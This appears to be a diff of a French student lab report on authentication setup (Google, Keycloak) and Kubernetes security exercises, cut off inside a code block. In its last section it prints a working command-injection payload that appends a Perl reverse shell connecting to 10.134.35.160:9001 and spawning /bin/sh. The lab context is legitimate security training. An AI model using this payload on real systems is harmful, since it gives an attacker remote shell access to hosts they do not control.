@@ -34,7 +34,7 @@ La configuration sur le site de google est confuse, car il y a beaucoup d'onglet
 
 La configuration pour permettre l'authentification à partir de keycloak est confuse, car bien que la page donne un exemple d'utilisation avec javascript, elle n'indique pas clairement les termes, par exemple elle ne décrit pas la signification de realm, ce qui rend difficile la compréhension de ce que fait le code. Ensuite, comme dans le cas précédent, l'adresse des URLs n'est pas claire et nous avons eu des problèmes pour accéder à la page qui se lance de Keycloak. 
 
-# Tp 1 Kubernetes Security
+# Tp 2 Kubernetes Security
 
 Nous avons commencé par créer un docker file pour chacun de nos services (frontend/backend) et nous avons ensuite mis à jour le docker-compose.yml 
 
@@ -85,8 +85,9 @@ Après cette modification, les services sont accessibles et fonctionnent correct
 
 
 
-# TP Kubernetes Security_2
-on est passé par [reverse shell ](https://www.revshells.com/) pour generer un  reverse shell perl.
+# TP 3 Kubernetes Security-2
+
+On est passé par [reverse shell ](https://www.revshells.com/) pour generer un  reverse shell perl.
 
 ```markdown
 google.com; perl -e 'use Socket;$i="10.134.35.160";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
